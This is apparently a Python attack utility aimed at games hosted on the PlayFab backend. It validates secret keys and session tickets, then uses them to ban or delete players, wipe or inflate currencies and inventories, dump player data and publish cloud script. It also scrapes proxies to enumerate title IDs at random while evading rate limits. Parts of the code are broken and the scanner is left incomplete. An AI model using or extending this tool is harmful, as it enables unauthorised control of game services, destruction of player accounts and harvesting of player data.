import PFArt as art
import os, base64
import DeezeySpammer
from colorama import Fore
import requests, time, json

# LIGHTBLACK_EX + WHITE = Looks clean and good

Input_Proxies = "Proxies.txt"
Checked_File = "Valid_Prox.txt"

os.system("title Fclown Utils")

## TODO
# Fix the Fore colors, in art there are defined colors for each function, use them
# Make sure colors are everywhere
# Use proxies in every request
# Add a duplicite line remover for the proxy 'scraper'

# Add more art and messages

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def BackToSESMenu():
    input("Press Enter to go back...")
    clear()
    print(art.SES_MAIN)

def BackToENTMenu():
    input("Press Enter to go back...")
    clear()
    print(art.ENT_MAIN)

def BackToPFIDMenu():
    input("Press Enter to go back...")
    clear()
    print(art.PFID_MAIN)

def GenString(length):
    import string, random
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_proxy(proxy, result_queue):
    proxies = {
        "http": proxy,
        "https": proxy
    }
    global success_count
    try:
        response = requests.get("https://playfab.com/assets/img/banner/sign-up.png", proxies=proxies, timeout=5)
        if response.status_code == 200:
            result_queue.put((proxy, True))
            success_count += 1
        else:
            result_queue.put((proxy, False))
    except Exception:
        result_queue.put((proxy, False))

def ProxyCheck():
    from concurrent.futures import ThreadPoolExecutor
    from queue import Queue
    with open(Input_Proxies, "r") as file:
        proxies = file.read().splitlines()
    
    total_proxies = len(proxies)
    global success_count
    success_count = 0

    result_queue = Queue()
    workers = round(0.2 * len(proxies)+10)
    if workers > 1000:
        workers = 1000

    print(f"{art.main}[┬] Checking proxy file with {workers} workers...{Fore.RESET}")
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(check_proxy, proxy, result_queue) for proxy in proxies]

        for i, future in enumerate(futures, 1):
            print(f"\r{art.main}[┴] {Fore.GREEN}Sucessful: {success_count} {Fore.LIGHTBLACK_EX}|{Fore.YELLOW} Failed: {i} | Amount Left: {total_proxies - i}", end="")
            future.result()
            if success_count >= 100:
                break
    
    with open(Checked_File, "w") as valid_file:
        while not result_queue.empty():
            proxy, success = result_queue.get()
            if success:
                valid_file.write(f"{proxy}\n")

def ScrapeProxies():
    sites = {
        "https://api.openproxylist.xyz/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
        "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
        "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt"
    }
    with open(Input_Proxies, "w") as proxFile:
        raw=""
        for site in sites:
            raw += requests.get(site).text
            raw +="\n"
        # Remove empty lines
        raw = "\n".join(line for line in raw.splitlines() if line.strip())

        # Remove duplicate lines
        unique_lines = []
        for line in raw.splitlines():
            if line.strip() not in unique_lines:
                unique_lines.append(line.strip())
        proxFile.write(raw)

def CheckProxiesFiles():
    if os.path.exists(Input_Proxies) == False:
        open(Input_Proxies,"w").close()

    print(f"{art.waiting}Scraping proxies...")
    ScrapeProxies()
    input(f"{Fore.LIGHTBLUE_EX}[|] Proxy list dumped to:\n | {os.getcwd()}\\{Input_Proxies}\n[|] Feel free to add your own, or press enter to continue...")
    ProxyCheck()

def checkSecretKey(secretKey):
    headers = {
        'X-SecretKey': secretKey,
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
    try:
        response = requests.post('https://invalidPFID.playfabapi.com/Admin/GetCloudScriptRevision', headers=headers)
        
        if response.status_code == 400:
            data = response.json()
            if data['errorCode'] == 1074: # Not dauthed
                return False
            
            elif data['errorCode'] == 1129: # How???
                return "RateLimit"
            
            elif data['errorCode'] == 1131: # Valid key, wrong id
                parts = data['errorMessage'].split("https://")
                pfid = parts[1].strip(".api.main.azureplayfab.com/")
                return pfid
            
            else:
                raise Exception(response.text) # Never gotten here so we good
    
    except Exception as ex:
        raise Exception(f"Special error, report to github: {ex}")

def SecretKey():
    TITLE_ID = ""
    SECRETKEY = input(f"{art.question}Secret Key:{art.main} ")
    output = checkSecretKey(SECRETKEY)
    match output:
        case "RateLimit":
            exit("Ratelimited")
        case False:
            exit("Invalid Key")
        case _: # basically default, python gotta be special
            TITLE_ID = output

    SKHeaders = {
    "Content-Type": "application/json",
    "X-SecretKey" : SECRETKEY
    }

    print(f"{art.info}Valid key!"); time.sleep(1)
    clear()
    while True:
        SKMAINChoice = input(art.SK_MAIN+"\n~> ")
        match SKMAINChoice:
            case "1":
                clear() 
                SK_1(TITLE_ID, SKHeaders)
                clear()
            case "2":
                clear()
                SK_2(TITLE_ID, SKHeaders)
                clear()
            case "3":
                clear()
                SK_3(TITLE_ID, SKHeaders)
                clear()
            case "4":
                clear()
                SK_4(TITLE_ID, SKHeaders)
                clear()

def SK_1(TITLE_ID, SKHEADERS): #omfg this took me like an hour dawg
    while True:
        SkSubChoice = input(art.SK_MAIN1+"\n~> ")
        match SkSubChoice.lower():
            case "1":
                duration = input(f"{art.question}Duration in Hours: ")
                reason = ""
                while True:
                    reason = input(f"{art.question}Reason: ")
                    if len(reason) > 140:
                        print(f"{art.error}Reason too long, maximum of 140 characters")
                    else:
                        break
                IDorIP = input(f"{Fore.MAGENTA}[┬] 1) Playfab ID\n[|] 2) IP\n[┴]~> {art.main}")
                global banJson
                if IDorIP == "1":
                    banJson = {"DurationInHours" : duration,"PlayFabId": input(f'{art.question}ID: '),"Reason":reason}
                elif IDorIP == "2":
                    banJson = {"DurationInHours" : duration,"IPAddress": input(f'{art.question}IP: '),"Reason":reason}
                banReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/BanUsers", headers=SKHEADERS, json={"Bans":[banJson]})
                print(json.dumps(banReq.json(), indent=4))
            case "2":
                playerID = input(f"{art.question}PlayFabId: ")
                delRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/DeleteMasterPlayerAccount", headers=SKHEADERS, json={"PlayFabId" : playerID})
                print(json.dumps(delRequest.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "3":
                Entreq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Authentication/GetEntityToken", headers=SKHEADERS)
                print(json.dumps(Entreq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "4":
                playerID = input(f"{art.question}Playfab ID: ")

                # -----------------Reset Currency----------------- #
                GetInfoRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/GetPlayerCombinedInfo", headers=SKHEADERS, json={"InfoRequestParameters": {"GetUserVirtualCurrency": True,"GetUserInventory": True}, "PlayFabId":playerID})
                for curency in GetInfoRequest.json()['data']['InfoResultPayload']["UserVirtualCurrency"]:
                    if GetInfoRequest.json()['data']['InfoResultPayload']['UserVirtualCurrency'][curency] == 0:
                        print(f"{Fore.YELLOW}[-] Currency {curency} is already at 0")
                        continue
                    payload = {
                            "Amount":GetInfoRequest.json()['data']['InfoResultPayload']['UserVirtualCurrency'][curency],
                            "PlayFabId":playerID,
                            "VirtualCurrency": curency
                    }
                    reset1 = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/SubtractUserVirtualCurrency", headers=SKHEADERS, data=json.dumps(payload))
                    if reset1.status_code == 200:
                        print(f"{art.info}Reset Currency: {curency}")
                    else:
                        print(json.dumps(reset1.json(), indent=4))
                
                # -----------------Reset User Data----------------- #
                reset2 = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/UpdateUserData", headers=SKHEADERS, json={"PlayFabId":playerID,"KeysToRemove":[""]}) # Null defaults to everything
                if reset2.status_code == 200:
                    print(f"{art.info}Reset User Data")
                else:
                    print(json.dumps(reset2.json(), indent=4))

                # -----------------Remove All Bans----------------- #
                GetAllBans = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/GetUserBans", headers=SKHEADERS, json={'PlayFabId':playerID})
                AllBans = []
                for ban in GetAllBans.json()['data']['BanData']:
                    AllBans.append(ban['BanId'])
                if len(AllBans) > 0:
                    reset3 = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/RevokeBans", headers=SKHEADERS, json={'BanIds':AllBans})
                    if reset3.status_code == 200:
                        print(f"{art.info}Revoked {len(AllBans)} Bans")
                    else:
                        print(json.dumps(reset3.json(), indent=4))
                else:
                    print(f"{Fore.YELLOW}[-] User has no bans")

                if len(GetInfoRequest.json()['data']['InfoResultPayload']['UserInventory']) > 0:
                    for item in GetInfoRequest.json()['data']['InfoResultPayload']['UserInventory']:
                        reset4 = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/RevokeInventoryItem", headers=SKHEADERS, json={"ItemInstanceId":item['ItemInstanceId'],"PlayFabId":playerID})
                        if reset4.status_code == 200:
                            print(f"{art.info}Removed Item: {item['ItemId']}")
                        else:
                            print(json.dumps(reset4.json(), indent=4))
                else:
                    print(f"{Fore.YELLOW}[-] User has no items to remove")
                print(f"{art.info} Reset all info!")
                input("Press enter to go back...")
                clear()
            case "5":
                print("Get info")
                playerID = input(f"{art.question}Playfab ID: ")
                PlrInfoReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/GetUserAccountInfo", headers=SKHEADERS, json={"PlayFabId":playerID})
                PlrInfoJson = PlrInfoReq.json()['data']["UserInfo"]

                print(f"{Fore.GREEN}[┬] Playfab ID: {playerID}")
                print(f"{Fore.GREEN}[|] Name: {PlrInfoJson['TitleInfo']['DisplayName']}")
                if PlrInfoJson['TitleInfo']['Origination'] == "Steam":
                    print(f"{Fore.GREEN}[|] Steam Name: {PlrInfoJson['SteamInfo']['SteamName']}")
                    print(f"{Fore.GREEN}[|] Country: {PlrInfoJson['SteamInfo']['SteamCountry']}")
                if PlrInfoJson["TitleInfo"]["Origination"] == "CustomId":
                    print(f"{Fore.GREEN}[|] Custom ID: {PlrInfoJson['CustomIdInfo']['CustomId']}")
                print(f"{Fore.GREEN}[┴] Banned: {PlrInfoJson['TitleInfo']['isBanned']}")

                print(f"{art.main}Raw information will be saved to: {Fore.GREEN}A_{PlrInfoJson['PlayFabId']}{art.main}.json")
                with open(f"A_{PlrInfoJson['PlayFabId']}.json", "w") as file:
                    file.write(str(json.dumps(PlrInfoJson, indent=4)))
                    file.close()
                input("Press enter to go back...")
                clear()
            case "6":
                playerID = input(f"{art.question}PlayFabId: ")
                CurrID = input(f"{art.question}Currency ID: ")
                global MoneyAmnt
                while True:
                    try:
                        MoneyAmnt = int(input(f"{art.question}Net Money Amount: "))
                        break
                    except:
                        print(f"{art.error}Not a number")
                if MoneyAmnt > 0:
                    payload = {
                        "Amount":MoneyAmnt,
                        "PlayFabId":playerID,
                        "VirtualCurrency":CurrID
                    }
                    moneyReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/AddUserVirtualCurrency", headers=SKHEADERS, data=json.dumps(payload))
                else:
                    payload = {
                        "Amount":int(str(MoneyAmnt).strip("-")),
                        "PlayFabId":playerID,
                        "VirtualCurrency":CurrID
                    }
                    moneyReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/SubtractUserVirtualCurrency", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(moneyReq.json(), indent=4))
                input("Press enter to go back...")
                clear()

            case "7":
                print("Give Item")
                playerID = input(f"{art.question}PlayFabId: ")
                RawItemIds = input(f"{art.question}Item IDs(seperate with comma): ")
                ItemIDs = RawItemIds.strip(' ').split(',')
                payload = {
                    'PlayFabId': playerID,
                    'ItemIds': ItemIDs
                }
                giveReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/GrantItemsToUser", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(giveReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "8":
                print("Remove Item")
                playerID = input(f"{art.question}PlayFabId: ")
                InstId = input(f"{art.question}Instance ID: ")
                payload = {
                    'PlayFabId': playerID,
                    'ItemInstanceId': InstId
                }
                removeReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/RevokeInventoryItem", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(removeReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "x":
                break

def SK_2(TITLE_ID, SKHEADERS):
    while True:
        clear()
        SkSubChoice = input(art.SK_MAIN2+"\n~> ")
        match SkSubChoice.lower():
            case "1":
                AllSegsReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/GetAllSegments", headers=SKHEADERS)
                segs = AllSegsReq.json()['data']['Segments']
                for seg in segs:
                    print(f"{Fore.GREEN}[{seg['Id']}] {seg['Name']}") # 1.0.1 Add total players in each
                input("Press enter to go back...")
                clear()
            case "2":
                SegId = input(f"{art.question}Segment Id: "+Fore.YELLOW)
                PlrsSegsReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Server/GetPlayersInSegment", headers=SKHEADERS, json={"SegmentId":SegId})
                with open(f"{TITLE_ID}_{SegId}_Segment.txt", "a") as file:
                    file.write(json.dumps(PlrsSegsReq.json(), indent=4))
                    print(f"{Fore.GREEN}[{PlrsSegsReq.status_code}] {art.main}Saved to file: {Fore.GREEN}{TITLE_ID}_{SegId}_Segment.txt{Fore.RESET}")
                    file.close()
                input("Press enter to go back...")
                clear()
            case "x":
                break

def SK_3(TITLE_ID, SKHEADERS):
    while True:
        SkSubChoice = input(art.SK_MAIN3+"\n~> ")
        match SkSubChoice.lower():
            case "1":
                print("Get Cloud Script")
                GetCloudReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/GetCloudScriptRevision", headers=SKHEADERS)
                print("# Save to file")
                print(json.dumps(GetCloudReq.json(), indent=4))
                input()
            case "2":
                payload = {
                    "Files":{
                        "FileContents":"READ FROM FILE",
                        "Filename":"FILENAME"
                    },
                    "Publish": True
                }
                UpdateCloudReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/UpdateCloudScript", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(UpdateCloudReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "x":
                break

def SK_4(TITLE_ID, SKHEADERS):
    while True:
        SkSubChoice = input(art.SK_MAIN4+"\n~> ")
        match SkSubChoice.lower():
            case "1":
                print("Add Currency Type")
                CurrCode = input(f"{art.question}Currency Code: ")
                CurrName = input(f"{art.question}Name: ")
                InitDep = input(f"{art.question}Initial Deposit: ")
                RechargeMax = input(f"{art.question}Recharge Max: ")
                RechargeRate = input(f"{art.question}Recharge Rate: ")
                payload = {
                    "VirtualCurrencies":{
                        "CurrencyCode":CurrCode,
                        "DisplayName":CurrName,
                        "InitialDeposit":InitDep,
                        "RechargeMax":RechargeMax,
                        "RechargeRate":RechargeRate,
                    }
                }
                AddCurrReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/AddVirtualCurrencyTypes", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(AddCurrReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "2":
                print("List Currency Types")
                LstCurrReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/ListVirtualCurrencyTypes", headers=SKHEADERS)
                print(json.dumps(LstCurrReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "3":
                print("Remove Currency Type")
                payload = { # Look into this, no way you need all that data to delete it
                    "VirtualCurrencies":{

                    }
                }
                RemCurrReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/RemoveVirtualCurrencyTypes", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(RemCurrReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "4":
                print("Add Catalog Item")
                # This is an entity token thing: https://learn.microsoft.com/en-us/rest/api/playfab/economy/catalog/create-draft-item
            case "5":
                print("Change Catalog Item")
                ItemID = input(f"{art.question}Item ID: ")
                DisplayName = input(f"{art.question}Name: ")
                Description = input(f"{art.question}Description: ")
                CurrID = input(f"{art.question}Currency ID: ")
                CurrPrice = input(f"{art.question}Price: ")
                payload = {
                    "Catalog": [
                        {
                            "ItemId": ItemID,
                            "DisplayName": DisplayName,
                            "Description": Description,
                            "VirtualCurrencyPrices": {
                                CurrID: CurrPrice
                            }
                }   ]   }
                ChangeItemReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/UpdateCatalogItems", headers=SKHEADERS, data=json.dumps(payload))
                print(json.dumps(ChangeItemReq.json(), indent=4))
                input("Press enter to go back...")
                clear()
            case "6":
                print("Get Title Data")
                ChangeItemReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/GetTitleData", headers=SKHEADERS)
                print(json.dumps(ChangeItemReq.json(), indent=4)) # Save to file
                input("Press enter to go back...")
                clear()
            case "7":
                print("Set Title Data")
                print(f"Sadly you can only change a single value at a time")
                Key = input(f"{art.question}Key: ")
                Value = input(f"{art.question}Value: ")
                if Value == "": Value = None
                payload = {"Key":Key,"Value":Value}
                ChangeItemReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Admin/SetTitleData", headers=SKHEADERS)
            case "x":
                break

def CustomID_Login(TITLE_ID):
    print(f"{art.question}Custom ID")
    while True:
        USER_ID = input(f"{art.question}~> {art.main}")
        MainHeaders = {"Content-Type": "application/json"}
        payload = {
            "TitleId" : TITLE_ID,
            "CustomId" : USER_ID,
            "CreateAccount" : 'False',
        }
        LoginResult = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/LoginWithCustomID", headers=MainHeaders, json=json.dumps(payload))
        if LoginResult.status_code == 200:
            print("Account is valid, taking you to the main menu...")
            time.sleep(2)
            session_ticket = LoginResult.json()['data']["SessionTicket"]
            Session_Login(session_ticket, TITLE_ID)
            break
        else:
            print(f"{art.error}Error: "+LoginResult.json()["errorMessage"])
            input("Press Enter to continue...")
            break

def EmailPass_Login(TITLE_ID):
    while True:
        print(f"{art.question}Username:")
        USRNAME = input(f"{art.question}~> {art.main}")
        print(f"{art.question}Password:")
        PASSWRD = input(f"{art.question}~> {art.main}")
        MainHeaders = {"Content-Type": "application/json"}
        payload = {
            "TitleId" : TITLE_ID,
            "Password" : PASSWRD,
            "Username" : USRNAME
        }
        LoginResult = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/LoginWithPlayFab", headers=MainHeaders, json=json.dumps(payload))
        if LoginResult.status_code == 200:
            print("Account is valid, taking you to the main menu...")
            time.sleep(2)
            session_ticket = LoginResult.json()['data']["SessionTicket"]
            Session_Login(session_ticket, TITLE_ID)
            break
        else:
            print(f"{art.error}[{LoginResult.status_code}] Error: "+LoginResult.json()["errorMessage"])
            input("Press Enter to continue...")
            break

def SteamTicket_Login(TITLE_ID):
    while True:
        ST_TICKET = input(f"{art.question}Steam Ticket:{art.main} ")
        SteamURL = f"https://{TITLE_ID}.playfabapi.com/Client/LoginWithSteam"
        headers = {
            "Host": f"{TITLE_ID}.playfabapi.com",
            "Content-Type": "application/json",
        }

        LoginResult = requests.post(url=SteamURL, json={
            "TitleId": TITLE_ID,
            "SteamTicket": ST_TICKET,
            "CreateAccount" : False
        }, headers=headers)
        
        if LoginResult.status_code == 200:
            print("Account is valid, taking you to the main menu...")
            time.sleep(2)
            sessionticket = LoginResult.json()["data"]["SessionTicket"]
            Session_Login(sessionticket, TITLE_ID)
            break
        else:
            print(f"{art.error}Error: "+LoginResult.json()["errorMessage"])
            input("Press Enter to continue...")
            break

def Session_Checker(ses_ticket, TITLE_ID):
    AccHeader = {
        "X-Authentication": ses_ticket,
        "Content-Type": "application/json"
    }
    TestRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/GetAccountInfo", headers=AccHeader)
    TestJson = TestRequest.json()
    if TestRequest.status_code == 200:
        print("Account is valid, taking you to the main menu...")
        time.sleep(2)
        Session_Login(ses_ticket, TITLE_ID)
    else:
        print(f"{art.error}Error: "+TestJson["errorMessage"])
        BackToSESMenu()

def Session_Login(session_ticket, TITLE_ID):
    AccHeader = {
        "X-Authentication": session_ticket,
        "Content-Type": "application/json"
    }
    clear()
    print(art.SES_MAIN)
    while True:
        Main_choice = input("~> ")
        match Main_choice:
            #Account Info
            case '1':
                print(f"{art.waiting}Getting account info...")
                CombPayload = {
                    "InfoRequestParameters": {
                        "GetCharacterInventories": True,
                        "GetCharacterList": True,
                        "GetPlayerProfile": True,
                        "GetPlayerStatistics": True,
                        "GetTitleData": True,
                        "GetUserAccountInfo": True,
                        "GetUserData": True,
                        "GetUserInventory": True,
                        "GetUserReadOnlyData": True,
                        "GetUserVirtualCurrency": True}}
                CombReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/GetPlayerCombinedInfo", headers=AccHeader, data=json.dumps(CombPayload))
                try:
                    CombReqJson = CombReq.json()['data']
                    AccInfo = CombReqJson["InfoResultPayload"]["AccountInfo"]
                    AccInvt = CombReqJson["InfoResultPayload"]["UserInventory"]
                    AccCurr = CombReqJson["InfoResultPayload"]["UserVirtualCurrency"]
                    print(f"{art.info}Sucessfully got info!")
                    print(f"{Fore.GREEN}[┬] Playfab ID: {CombReqJson['PlayFabId']}")
                    print(f"{Fore.GREEN}[|] Name: {AccInfo['TitleInfo']['DisplayName']}")
                    print(f"{Fore.GREEN}[|] Cosmetics: {len(AccInvt)}")
                    if AccInfo['TitleInfo']['Origination'] == "Steam":
                        print(f"{Fore.GREEN}[|] Steam Name: {AccInfo['SteamInfo']['SteamName']}")
                        print(f"{Fore.GREEN}[|] Country: {AccInfo['SteamInfo']['SteamCountry']}")
                    for currency in AccCurr:
                        print(f"{Fore.GREEN}[|] {currency}: {AccCurr[currency]}")
                    print(f"{Fore.GREEN}[┴] Banned: {AccInfo['TitleInfo']['isBanned']}")
                    print(f"{art.main}Raw information will be saved to: {Fore.GREEN}{CombReqJson['PlayFabId']}{art.main}.json")

                    with open(f"{CombReqJson['PlayFabId']}.json", "w") as file:
                        file.write(str(json.dumps(CombReqJson, indent=4)))
                        file.close()
                    BackToSESMenu()
                except:
                    print(f"{art.error}Somthing failed...\n{json.dumps(CombReq.json(), indent=4)}")

            case '2':
                CatalogReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/GetCatalogItems", headers=AccHeader)
                CatalogData = json.dumps(CatalogReq.json(), indent=4)
                with open(f"{TITLE_ID}_Catalog.txt", "a") as file:
                    file.write(str(CatalogData))
                    print(f"{Fore.GREEN}[{CatalogReq.status_code}] {art.main}Saved to file: {Fore.GREEN}{TITLE_ID}_Catalog.txt{Fore.RESET}")
                    file.close()
                BackToSESMenu()

            case '3':
                Cos_ID = input("Costmetic ID : ")
                Cos_Curr = input("Currency ID: ")
                Cos_Price = input("Price : ")

                BuyPayload = {"ItemId" : Cos_ID, "Price" : Cos_Price, "VirtualCurrency" : Cos_Curr}
                BuyReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/PurchaseItem", headers=AccHeader, json=BuyPayload)
                if BuyReq.status_code == 200:
                    print(f"{art.info}Sucessfully bought {Cos_ID} | Instance ID: {BuyReq.json()['data']['Items'][0]['ItemInstanceId']}")
                else:
                    print(f"{art.error}Failed to buy cosmetic")
                BackToSESMenu()
            
            case '4':
                while True:
                    try:
                        AddMon_Amnt = input("How much: ")
                        AddMon_Amnt = int(AddMon_Amnt)
                        break
                    except:
                        print("Not A number")
                AddMon_Curr = input("Currency ID: ")
                AddMon_Payload = {
                    "Amount" : int(AddMon_Amnt),
                    "VirtualCurrency" : AddMon_Curr
                }
                AddMonReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/AddUserVirtualCurrency", headers=AccHeader, data=json.dumps(AddMon_Payload))
                if AddMonReq.json()["error"] == "APINotEnabledForGameClientAccess":
                    print(f"{art.error}Cannot add money in this Title ID")
                else:
                    print(f"{art.info}New balance: {AddMonReq.json()['data']['Balance']}")
                BackToSESMenu()
            
            case '5':
                CngName_New = input("Name: ")
                CngName_Payload = {"DisplayName" : CngName_New}
                CngNameReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/UpdateUserTitleDisplayName", headers=AccHeader, data=json.dumps(CngName_Payload))
                if CngNameReq.status_code == 200:
                    print(f"{art.info}Sucessfully set name to: {CngName_New}")
                print(art.main,json.dumps(CngNameReq.json(), indent=4),Fore.RESET)
                BackToSESMenu()

            case '6':
                print(f"{art.waiting}Generating Entity token...")
                EntityTokenRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Authentication/GetEntityToken", headers=AccHeader)
                if EntityTokenRequest.status_code == 200:
                    print(f"{art.info}Sucessfully generated Entity Token, switching menus...")
                    time.sleep(2)
                    EntityJson = EntityTokenRequest.json()['data']
                    Entity_Login(EntityJson['EntityToken'], TITLE_ID, EntityJson['Entity'])
                    break
                else:
                    print(f"{art.error}Failed to generate entity token\n{json.dumps(EntityTokenRequest.json(),indent=4)}")
                BackToSESMenu()

def Entity_Login(entity_ticket, Entity=None):
    DeObfENT = base64.b64decode(entity_ticket)
    JsonENT = json.loads(DeObfENT[47:].decode('utf-8'))
    TITLE_ID = JsonENT["ec"].split('/')[1]
    EntHeader = {
        "X-EntityToken": entity_ticket,
        "Content-Type": "application/json"
    }
    clear()
    print(Entity)
    print(art.ENT_MAIN)
    while True:
        Main_choice = input("~> ")
        match Main_choice:
            case '1':
                print(f"{art.waiting}Getting cloud scripts...")
                ListFuncRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/CloudScript/ListFunctions", headers=EntHeader)
                ListHttpFuncRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/CloudScript/ListHttpFunctions", headers=EntHeader)
                if ListFuncRequest.json()['errorCode'] == 1089:
                    print(f"{art.error}Error: Account does not have permission to access, execute, or change cloud scripts\n{art.error}Raw Error: {ListFuncRequest.json()['errorMessage']}")
                elif ListFuncRequest.json()['errorCode'] == 1335:
                    print(f"{art.error}Invalid Entity Token")
                    time.sleep(2)
                    break
                else:
                    print("=============CloudScript/ListFunctions================\n"+json.dumps(ListFuncRequest.json(), indent=4))
                    print("=============CloudScript/ListHttpFunctions================\n"+json.dumps(ListHttpFuncRequest.json(), indent=4))
                BackToENTMenu()
            
            case '2':
                funcName = input("Function Name: ")

                entity = {
                    "Id": input("Entity ID: "),
                    "Type": "title_player_account"
                }
                print("-------------Function Parameters-------------")
                print("Type nothing to stop")
                function_params = {}

                while True:
                    key = input("Parameter Key: ")
                    if key == None:
                        break
                    value = input("Parameter Value: ")
                    AddParameter = {key:value}
                    function_params.update(AddParameter)
                
                print("Does this look good?")
                print(json.dumps(function_params,indent=4))
                yn = input("Yes/No: ")
                # I dont even know if this works tbh
                payload = {
                    "FunctionName": funcName,
                    "Entity": entity,
                    "FunctionParameter": function_params,
                    "GeneratePlayStreamEvent": False,
                }
                
                response = requests.post(f"https://{TITLE_ID}.playfabapi.com/CloudScript/ExecuteFunction", headers=EntHeader, data=json.dumps(payload))
                print(json.dumps(response.json(), indent=4))
            
            case '4':
                print(f"{art.waiting}Getting inventory...")
                GetObjRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Inventory/GetInventoryItems", headers=EntHeader)
                print("==============Inventory/GetInventoryItems===============\n"+json.dumps(GetObjRequest.json(), indent=4))
                BackToENTMenu()
            
            case '5':
                InstanceID = input("Cosmetic Instance ID: ")
                Delete_Payload =  {
                    "Entity": {
                        "Id": Entity["Id"],
                        "Type": Entity["Type"] 
                    },
                    "Item": {
                        "Id": InstanceID
                    }
                }
                DeleteRequest = requests.post(f"https://{TITLE_ID}.playfabapi.com/Inventory/DeleteInventoryItems", headers=EntHeader, data=json.dumps(Delete_Payload))
                if DeleteRequest.status_code == 200:
                    print(f"{art.info}Sucessfully deleted cosmetic!")
                print(art.main,json.dumps(DeleteRequest.json(), indent=4),Fore.RESET)
                BackToENTMenu()
            case '6':
                print(f"{Fore.GREEN}[┬] ID: {Entity['Id']}\n[|] Type: {Entity['Type']}\n[┴] Ticket: {entity_ticket}")

def CheckTitleID(TITLE_ID, proxy):
    try:
        posReq = requests.post(f"https://{TITLE_ID}.playfabapi.com/Client/LoginWithCustomID", data=json.dumps({"TitleId" : TITLE_ID}), headers={"Content-Type": "application/json"}, proxies={"http": proxy, "https": proxy})
        #print(json.dumps(posReq.json(), indent=4))
        if not posReq.json()['error']:
            if posReq.status_code != 429: # Ratelimit
                return "True"
            else:
                return "Proxy"
        else:
            return "False"
    except Exception:
        return "Proxy"

def FindPFs():
    import random, string

    CheckProxiesFiles()
    file = open(Checked_File,"r")
    Checkedproxies = file.read().splitlines()
    file.close()
    proxIndex = 0
    if len(Checkedproxies) == 0: exit(f"{art.error}No proxies were valid")
    print("\n")
    counter = 0
    clear()
    alfaNum = ['0','1','2','3','4','5','6','7','8','9',*string.ascii_uppercase]# * = unpack list
    while True:
        print(f"\r{Fore.GREEN}[?] Scanning for playfab IDs. Checked: {counter}", end='')
        posID = ""
        for _ in range(5): posID+=random.choice(alfaNum)
        counter += 1
        proxIndex += 1
        if proxIndex >= len(Checkedproxies):
            quit(f"\n{art.OOProxArt}")#art here

